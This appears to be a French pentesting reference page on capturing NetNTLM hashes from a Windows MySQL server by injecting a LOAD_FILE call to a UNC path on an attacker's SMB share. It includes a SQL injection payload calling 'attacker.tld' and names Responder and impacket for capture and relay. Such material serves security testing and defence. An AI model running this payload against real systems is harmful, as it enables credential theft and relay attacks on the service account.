---
title: "Capturer des hashs NetNTLM depuis MySQL via des chemins UNC"
description: "Forcer un hôte MySQL Windows à s'authentifier auprès d'un partage SMB de l'attaquant via LOAD_FILE, capturant le hash NetNTLM du compte de service pour le cracking ou le relais."
keywords:
  - capture de hash NTLM
  - authentification SMB
  - LOAD_FILE UNC
  - Responder
  - NetNTLMv2
---

# Capture UNC et NTLM

Quand un hôte MySQL Windows se connecte à un chemin UNC, il s'authentifie auprès du serveur SMB distant en tant que compte exécutant le service MySQL. Pointer ce chemin vers un listener SMB contrôlé par l'attaquant capture la réponse NetNTLMv2 du compte, qui peut être crackée hors ligne ou relayée vers un autre service.

Un seul `LOAD_FILE` vers le partage de l'attaquant déclenche l'authentification :

```sql
' UNION SELECT LOAD_FILE('\\\\attacker.tld\\share\\x'),NULL,NULL-- 
```

Un listener tel que Responder ou `impacket-smbserver` sur `attacker.tld` enregistre le hash NetNTLMv2 entrant pour le compte de service MySQL. L'utilité de ce hash dépend du compte : un service exécuté sous un utilisateur de domaine donne un identifiant crackable ou relayable, tandis que `NT AUTHORITY\SYSTEM` donne un hash de compte machine qui est seulement relayable.

Contrairement à l'exfiltration DNS, ce canal fait fuiter un identifiant plutôt que des données de requête, donc c'est souvent le résultat à plus forte valeur contre une cible Windows, surtout là où le service MySQL s'exécute sous un compte de domaine privilégié. Il nécessite le même privilège `FILE` et un `secure_file_priv` permissif, et ne fonctionne que sous Windows.

## Outils

- Responder
- impacket (`smbserver.py`, `ntlmrelayx.py`)

## Références

- MySQL Reference Manual: LOAD_FILE, FILE privilege
- OWASP Testing Guide: Testing for SQL Injection
